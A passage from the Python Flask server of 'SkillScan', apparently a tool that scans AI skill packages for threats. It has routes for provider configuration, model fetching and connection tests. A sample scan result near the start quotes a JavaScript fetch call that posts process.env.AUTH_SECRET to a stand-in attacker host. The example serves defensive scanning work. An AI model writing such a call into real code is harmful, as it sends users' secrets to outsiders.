                "description": "The file src/api.js reads process.env.AUTH_SECRET and sends it to an external unverified endpoint.",
                "evidence": "fetch('https://evil-analytics.xyz/collect', { method: 'POST', body: process.env.AUTH_SECRET })",
                "location": "src/api.js:42",
                "recommendation": "Immediately remove src/api.js and revoke any exposed secrets."
            }
        ],
        "network_analysis": {
            "outbound_connections": [
                {
                    "url": "https://evil-analytics.xyz/collect",
                    "file": "src/api.js",
                    "purpose": "Credential exfiltration",
                    "risk": "dangerous"
                }
            ],
            "data_sent_externally": "Environment variables including AUTH_SECRET sent via POST"
        },
        "file_risk_assessment": [
            {
                "path": "SKILL.md",
                "role": "Skill definition and instructions",
                "risk_level": "safe",
                "threats_found": 0,
                "one_line": "Standard documentation with no malicious instructions"
            },
            {
                "path": "src/api.js",
                "role": "Network and auth logic",
                "risk_level": "dangerous",
                "threats_found": 1,
                "one_line": "Contains active credential harvesting and external exfiltration"
            }
        ],
        "permissions_analysis": {
            "file_system_access": [],
            "network_access": ["evil-analytics.xyz"],
            "shell_execution": [],
            "environment_access": ["AUTH_SECRET"],
            "excessive_permissions": True,
            "justification": "A local auth utility has no legitimate need to beacon environment variables to an external server."
        },
        "security_positives": [
            "Includes clean SKILL.md documentation format",
            "Uses parameterized inputs in utility helpers"
        ],
        "remediation_priority": [
            {
                "step": 1,
                "action": "Remove the malicious exfiltration call to evil-analytics.xyz",
                "severity": "critical",
                "effort": "low",
                "why": "Stops ongoing data theft immediately"
            }
        ],
        "stats": {
            "files_scanned": 8,
            "total_threats": 1,
            "critical": 1,
            "high": 0,
            "medium": 0,
            "low": 0,
            "info": 0,
            "safe_files": 7,
            "risky_files": 1
        }
    }
    save_scans()
    return jsonify({"success": True, "scan_id": scan_id})

@app.route('/config', methods=['GET', 'POST'])
@app.route('/api/config', methods=['GET', 'POST'])
def handle_config():
    if request.method == 'POST':
        data = request.json or {}
        provider = data.get("provider")
        api_key = data.get("api_key")
        model = data.get("model")
        base_url = data.get("base_url")
        
        conf = load_config()
        if provider:
            conf["provider"] = provider
            if provider not in conf or not isinstance(conf[provider], dict):
                conf[provider] = {}
            if api_key is not None and str(api_key).strip():
                conf[provider]["api_key"] = str(api_key).strip()
            if model is not None and str(model).strip():
                conf[provider]["model"] = str(model).strip()
            if base_url is not None and str(base_url).strip():
                conf[provider]["base_url"] = str(base_url).strip()
            
            with open(BASE_DIR / 'config.json', 'w', encoding='utf-8') as f:
                json.dump(conf, f, indent=2)
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "No provider specified"}), 400
        
    conf = load_config()
    curr_provider = _resolve_provider_name(conf)
    p_conf = conf.get(curr_provider, {})
    if not isinstance(p_conf, dict):
        p_conf = {}

    curr_cat = DYNAMIC_CATALOG.get(curr_provider, {})
    curr_models = curr_cat.get("models", []) if isinstance(curr_cat, dict) else (curr_cat if isinstance(curr_cat, list) else [])
    curr_model = p_conf.get("model") or (curr_models[0] if curr_models else "default")
    has_key = bool(_resolve_api_key(curr_provider, p_conf))
    curr_base_url = p_conf.get("base_url") or (curr_cat.get("api", "") if isinstance(curr_cat, dict) else "") or DEFAULT_BASE_URLS.get(curr_provider, "")

    # Providers metadata and models options for all 200+ providers
    options = {}
    providers_meta = {}
    all_keys = sorted(list(DYNAMIC_CATALOG.keys()))

    for p_name in all_keys:
        p_info = DYNAMIC_CATALOG[p_name]
        p_models = p_info.get("models", []) if isinstance(p_info, dict) else (p_info if isinstance(p_info, list) else [])
        options[p_name] = p_models
        cfg = conf.get(p_name, {})
        if not isinstance(cfg, dict):
            cfg = {}

        p_display = p_info.get("name", p_name.capitalize()) if isinstance(p_info, dict) else p_name.capitalize()
        p_api = (p_info.get("api") if isinstance(p_info, dict) else "") or DEFAULT_BASE_URLS.get(p_name, "")
        p_env = p_info.get("env", []) if isinstance(p_info, dict) else [ENV_API_KEY_VARS.get(p_name, f"{p_name.upper()}_API_KEY")]

        providers_meta[p_name] = {
            "id": p_name,
            "name": p_display,
            "has_key": bool(_resolve_api_key(p_name, cfg)),
            "model": cfg.get("model") or (p_models[0] if p_models else "default"),
            "base_url": cfg.get("base_url") or p_api,
            "requires_key": p_name not in ("ollama", "lmstudio"),
            "requires_base_url": p_name in ("ollama", "lmstudio", "custom"),
            "env_vars": p_env,
            "models_count": len(p_models)
        }

    total_models = sum(len(v) for v in options.values())

    return jsonify({
        "success": True,
        "provider": curr_provider,
        "model": curr_model,
        "current_provider": curr_provider,
        "current_model": curr_model,
        "base_url": curr_base_url,
        "has_key": has_key,
        "options": options,
        "providers_meta": providers_meta,
        "popular_providers": POPULAR_PROVIDERS,
        "local_providers": LOCAL_PROVIDERS,
        "all_providers": all_keys,
        "total_providers": len(all_keys),
        "total_models": total_models
    })

@app.route('/api/auto-fetch-models', methods=['GET', 'POST'])
@app.route('/api/fetch-models', methods=['GET', 'POST'])
def auto_fetch_models():
    if request.method == 'POST':
        data = request.json or {}
        provider = data.get("provider", "openai")
        base_url = data.get("base_url")
        api_key = data.get("api_key")
    else:
        provider = request.args.get("provider", "openai")
        base_url = request.args.get("base_url")
        api_key = request.args.get("api_key")

    provider = str(provider).strip().lower()
    conf = load_config()
    p_conf = conf.get(provider, {})
    if not isinstance(p_conf, dict):
        p_conf = {}

    if not base_url:
        base_url = p_conf.get("base_url") or DEFAULT_BASE_URLS.get(provider, "")
        if not base_url:
            cat_entry = DYNAMIC_CATALOG.get(provider) or {}
            if isinstance(cat_entry, dict) and cat_entry.get("api"):
                base_url = cat_entry["api"]

    if not api_key:
        api_key = _resolve_api_key(provider, p_conf)

    # 1. Ollama local
    if provider == "ollama":
        ollama_url = f"{(base_url or 'http://localhost:11434').rstrip('/')}/api/tags"
        try:
            req = urllib.request.Request(ollama_url)
            with urllib.request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read().decode('utf-8'))
                models = [m.get("name") for m in data.get("models", []) if m.get("name")]
                if models:
                    if "ollama" in DYNAMIC_CATALOG:
                        DYNAMIC_CATALOG["ollama"]["models"] = models
                    return jsonify({"success": True, "provider": provider, "models": models, "source": "live", "count": len(models)})
        except Exception:
            pass
        cat_models = (DYNAMIC_CATALOG.get("ollama") or {}).get("models", BUILTIN_MODELS.get("ollama", []))
        return jsonify({"success": True, "provider": provider, "models": cat_models, "source": "catalog", "count": len(cat_models)})

    # 2. LM Studio local
    if provider == "lmstudio":
        lm_url = f"{(base_url or 'http://localhost:1234/v1').rstrip('/')}/models"
        try:
            req = urllib.request.Request(lm_url)
            with urllib.request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read().decode('utf-8'))
                models = [m.get("id") for m in data.get("data", []) if m.get("id")]
                if models:
                    if "lmstudio" in DYNAMIC_CATALOG:
                        DYNAMIC_CATALOG["lmstudio"]["models"] = models
                    return jsonify({"success": True, "provider": provider, "models": models, "source": "live", "count": len(models)})
        except Exception:
            pass
        cat_models = (DYNAMIC_CATALOG.get("lmstudio") or {}).get("models", BUILTIN_MODELS.get("lmstudio", []))
        return jsonify({"success": True, "provider": provider, "models": cat_models, "source": "catalog", "count": len(cat_models)})

    # 3. Live models endpoint for OpenAI-compatible providers
    live_models = []
    models_url = ""
    if base_url:
        clean_base = base_url.rstrip('/')
        if clean_base.endswith('/chat/completions'):
            clean_base = clean_base[:-len('/chat/completions')]
        models_url = f"{clean_base}/models"
    elif provider == "openai":
        models_url = "https://api.openai.com/v1/models"
    elif provider == "openrouter":
        models_url = "https://openrouter.ai/api/v1/models"
    elif provider == "groq":
        models_url = "https://api.groq.com/openai/v1/models"
    elif provider == "mistral":
        models_url = "https://api.mistral.ai/v1/models"
    elif provider == "deepseek":
        models_url = "https://api.deepseek.com/models"
    elif provider == "nvidia":
        models_url = "https://integrate.api.nvidia.com/v1/models"

    if models_url and api_key:
        try:
            headers = {"Authorization": f"Bearer {api_key}", "User-Agent": "SkillScanner/1.0"}
            req = urllib.request.Request(models_url, headers=headers)
            with urllib.request.urlopen(req, timeout=4) as resp:
                d = json.loads(resp.read().decode('utf-8'))
                raw_items = d.get("data", [])
                if isinstance(raw_items, list):
                    live_models = [m.get("id") for m in raw_items if isinstance(m, dict) and m.get("id")]
                if live_models:
                    if provider in DYNAMIC_CATALOG and isinstance(DYNAMIC_CATALOG[provider], dict):
                        DYNAMIC_CATALOG[provider]["models"] = live_models
                    return jsonify({"success": True, "provider": provider, "models": live_models, "source": "live", "count": len(live_models)})
        except Exception:
            pass

    # 4. Fallback to catalog
    cat_entry = DYNAMIC_CATALOG.get(provider) or {}
    cat_models = cat_entry.get("models", []) if isinstance(cat_entry, dict) else (cat_entry if isinstance(cat_entry, list) else [])
    if not cat_models:
        cat_models = BUILTIN_MODELS.get(provider, ["default"])
    return jsonify({"success": True, "provider": provider, "models": cat_models, "source": "catalog", "count": len(cat_models)})

@app.route('/api/refresh-catalog', methods=['POST', 'GET'])
def refresh_catalog_endpoint():
    try:
        _init_catalog()
        total_models = sum(len(v.get("models", [])) for v in DYNAMIC_CATALOG.values() if isinstance(v, dict))
        return jsonify({
            "success": True,
            "providers_count": len(DYNAMIC_CATALOG),
            "models_count": total_models,
            "message": f"Successfully synced {len(DYNAMIC_CATALOG)} AI providers and {total_models} models!"
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/ollama-models', methods=['GET'])
def get_ollama_models():
    return auto_fetch_models()

@app.route('/api/lmstudio-models', methods=['GET'])
def get_lmstudio_models():
    return auto_fetch_models()

@app.route('/api/test-connection', methods=['POST'])
def test_connection():
    data = request.json or {}
    provider = data.get("provider", "openai")
    api_key = data.get("api_key")
    model = data.get("model")
    base_url = data.get("base_url")

    conf = load_config()
    p_conf = conf.get(provider, {})
    if not isinstance(p_conf, dict):
        p_conf = {}

    effective_conf = dict(p_conf)
    if api_key:
        effective_conf["api_key"] = str(api_key).strip()
    if base_url:
        effective_conf["base_url"] = str(base_url).strip()

    resolved_key = _resolve_api_key(provider, effective_conf)
    if resolved_key:
        effective_conf["api_key"] = resolved_key

    if not model:
        cat_entry = DYNAMIC_CATALOG.get(provider, {})
        cat_models = cat_entry.get("models", []) if isinstance(cat_entry, dict) else []
        model = effective_conf.get("model") or (cat_models[0] if cat_models else (BUILTIN_MODELS.get(provider) or ["default"])[0])

    try:
        test_sys = "You are a test helper. Reply ONLY with valid JSON: {\"status\": \"ok\"}."
        test_user = "ping"
        raw_resp = _execute_ai_request(provider, effective_conf, model, test_sys, test_user, json_mode=False)
        return jsonify({
            "success": True,
            "message": f"Successfully connected to {provider} using {model}!",
            "raw_response": raw_resp[:150]
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

def open_browser():
    conf = load_config()
    server_conf = conf.get("server", {})
    host = server_conf.get("host", "localhost")
    port = server_conf.get("port", 5000)
    time.sleep(1.2)
    webbrowser.open_new(f"http://{host}:{port}")

if __name__ == '__main__':
    conf = load_config()
    provider = conf.get("provider", "anthropic")
    model = conf.get(provider, {}).get("model", "unknown")
    server_conf = conf.get("server", {})
    host = server_conf.get("host", "localhost")
    port = server_conf.get("port", 5000)
    
    url = f"http://{host}:{port}"
    print("====================================")
    print("  SkillScan - AI Package Security   ")
    print("====================================")
    print(f"  Provider : {provider}")
    print(f"  Model    : {model}")
    print(f"  URL      : {url}")
    print("====================================")
    
    threading.Thread(target=open_browser, daemon=True).start()
    app.run(host=host, port=port, debug=False, use_reloader=False)
